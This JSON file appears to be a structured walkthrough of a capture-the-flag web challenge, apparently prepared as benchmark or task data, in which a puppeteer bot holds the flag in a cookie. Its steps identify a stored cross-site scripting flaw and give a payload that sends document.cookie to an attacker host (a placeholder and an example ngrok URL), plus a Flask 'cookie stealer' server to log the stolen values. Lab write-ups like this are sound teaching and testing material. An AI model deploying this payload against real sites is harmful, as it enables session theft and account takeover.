{
    "AttackModel": {
        "Steps": [
            {
                "StepNumber": 1,
                "StepString": "Examine the 'challenge/index.js' file in the source code zip.",
                "Substeps": [
                    {
                        "SubstepNumber": 1.1,
                        "SubstepString": "Examine the 'challenge/index.js' file in the source code zip."
                    }
                ]
            },
            {
                "StepNumber": 2,
                "StepString": "The application connects to a sqlite database ('const db = new Database('toy_workshop.db');'), so inspect 'database.js'.",
                "Substeps": [
                    {
                        "SubstepNumber": 2.1,
                        "SubstepString": "The application connects to a sqlite database ('const db = new Database('toy_workshop.db');'), so inspect 'database.js'."
                    }
                ]
            },
            {
                "StepNumber": 3,
                "StepString": "'database.js' lets you add and read items from the database. The query variable control is possible via the website, but SQL injection is unsuccessful.",
                "Substeps": [
                    {
                        "SubstepNumber": 3.1,
                        "SubstepString": "'database.js' lets you add and read items from the database. The query variable control is possible via the website, but SQL injection is unsuccessful."
                    }
                ]
            },
            {
                "StepNumber": 4,
                "StepString": "Examine the 'challenge/routes/index.js' file. We find an '/api/submit' endpoint which the frontend sends user data.",
                "Substeps": [
                    {
                        "SubstepNumber": 4.1,
                        "SubstepString": "Examine the 'challenge/routes/index.js' file. We find an '/api/submit' endpoint which the frontend sends user data."
                    }
                ]
            },
            {
                "StepNumber": 5,
                "StepString": "This function adds our user provided query to the database and then calls 'bot.readQueries(db)'.",
                "Substeps": [
                    {
                        "SubstepNumber": 5.1,
                        "SubstepString": "This function adds our user provided query to the database and then calls 'bot.readQueries(db)'."
                    }
                ]
            },
            {
                "StepNumber": 6,
                "StepString": "We cannot reach the '/queries' endpoint as the IP address required is 127.0.0.1, any other IP is redirected to '/'.",
                "Substeps": [
                    {
                        "SubstepNumber": 6.1,
                        "SubstepString": "We cannot reach the '/queries' endpoint as the IP address required is 127.0.0.1, any other IP is redirected to '/'."
                    }
                ]
            },
            {
                "StepNumber": 7,
                "StepString": "Inspect 'challenge/bot.js' to understand 'bot.readQueries(db)' function. It reveals that the bot imports puppeteer, a headless browser controlled via JavaScript, holds the flag, loads the application home page, sets the 'flag' cookie, visits the '/queries' endpoint, and then exits.",
                "Substeps": [
                    {
                        "SubstepNumber": 7.1,
                        "SubstepString": "Inspect 'challenge/bot.js' to understand 'bot.readQueries(db)' function. It reveals that the bot imports puppeteer, a headless browser controlled via JavaScript, holds the flag, loads the application home page, sets the 'flag' cookie, visits the '/queries' endpoint, and then exits."
                    }
                ]
            },
            {
                "StepNumber": 8,
                "StepString": "This is a stored cross-site scripting vulnerability, where we can send a malicious script through the frontend to the database and when a user visits the '/queries' page, the server sends the malicious code to the user.",
                "Substeps": [
                    {
                        "SubstepNumber": 8.1,
                        "SubstepString": "This is a stored cross-site scripting vulnerability, where we can send a malicious script through the frontend to the database and when a user visits the '/queries' page, the server sends the malicious code to the user."
                    }
                ]
            },
            {
                "StepNumber": 9,
                "StepString": "Our malicious script grabs the current cookies and redirects to our webpage with these cookies as parameters in the request.",
                "Substeps": [
                    {
                        "SubstepNumber": 9.1,
                        "SubstepString": "Our malicious script grabs the current cookies and redirects to our webpage with these cookies as parameters in the request."
                    }
                ]
            },
            {
                "StepNumber": 10,
                "StepString": "We use a common XSS code: '<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>' to redirect to our webpage by changing the 'document.location' and setting the 'c' argument to 'document.cookie', which contains the current page's cookies.",
                "Substeps": [
                    {
                        "SubstepNumber": 10.1,
                        "SubstepString": "We use a common XSS code: '<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>' to redirect to our webpage by changing the 'document.location' and setting the 'c' argument to 'document.cookie', which contains the current page's cookies."
                    }
                ]
            },
            {
                "StepNumber": 11,
                "StepString": "We need an actively running server to receive this request and log the cookie. A Python Flask application, does this in 'xss-cookie-stealer.py'. This script defines one route, '/', which reads the 'c' parameter in the request URL, opens a file called 'cookies.txt', writes the contents of 'c' parameter to that file, and then redirects to 'https://google.com'. We run this server on all interfaces '0.0.0.0' on port '16361'.",
                "Substeps": [
                    {
                        "SubstepNumber": 11.1,
                        "SubstepString": "We need an actively running server to receive this request and log the cookie."
                    },
                    {
                        "SubstepNumber": 11.2,
                        "SubstepString": "A Python Flask application, does this in 'xss-cookie-stealer.py'. This script defines one route, '/', which reads the 'c' parameter in the request URL, opens a file called 'cookies.txt', writes the contents of 'c' parameter to that file, and then redirects to 'https://google.com'."
                    },
                    {
                        "SubstepNumber": 11.3,
                        "SubstepString": "We run this server on all interfaces '0.0.0.0' on port '16361'."
                    }
                ]
            },
            {
                "StepNumber": 12,
                "StepString": "You can run this script anywhere that is internet accessible, port forward port '16361' or deploy on Google Cloud. But, the easiest method is to use ngrok.",
                "Substeps": [
                    {
                        "SubstepNumber": 12.1,
                        "SubstepString": "You can run this script anywhere that is internet accessible, port forward port '16361' or deploy on Google Cloud. But, the easiest method is to use ngrok."
                    }
                ]
            },
            {
                "StepNumber": 13,
                "StepString": "Create account at ngrok, download the application, and login. Start the Flask python server with 'python xss-cookie-stealer.py' and then run '/ngrok http 16361'. Ngrok will display a URL in the form 'http://<subdomain>.ngrok.io'.",
                "Substeps": [
                    {
                        "SubstepNumber": 13.1,
                        "SubstepString": "Create account at ngrok, download the application, and login."
                    },
                    {
                        "SubstepNumber": 13.2,
                        "SubstepString": "Start the Flask python server with 'python xss-cookie-stealer.py' and then run '/ngrok http 16361'."
                    },
                    {
                        "SubstepNumber": 13.3,
                        "SubstepString": "Ngrok will display a URL in the form 'http://<subdomain>.ngrok.io'."
                    }
                ]
            },
            {
                "StepNumber": 14,
                "StepString": "Input your ngrok URL into the malicious payload. For example, if ngrok URL is 'http://92832de0.ngrok.io', then the payload should be '<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>'",
                "Substeps": [
                    {
                        "SubstepNumber": 14.1,
                        "SubstepString": "Input your ngrok URL into the malicious payload. For example, if ngrok URL is 'http://92832de0.ngrok.io', then the payload should be '<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>'"
                    }
                ]
            },
            {
                "StepNumber": 15,
                "StepString": "Finally, input the payload into the frontend for the application. Wait for a few seconds for the puppeteer instance to start and load the page. After this, you should see the flag in your Flask terminal and in the 'cookies.txt' file.",
                "Substeps": [
                    {
                        "SubstepNumber": 15.1,
                        "SubstepString": "Finally, input the payload into the frontend for the application."
                    },
                    {
                        "SubstepNumber": 15.2,
                        "SubstepString": "Wait for a few seconds for the puppeteer instance to start and load the page."
                    },
                    {
                        "SubstepNumber": 15.3,
                        "SubstepString": "After this, you should see the flag in your Flask terminal and in the 'cookies.txt' file."
                    }
                ]
            }
        ]
    }
}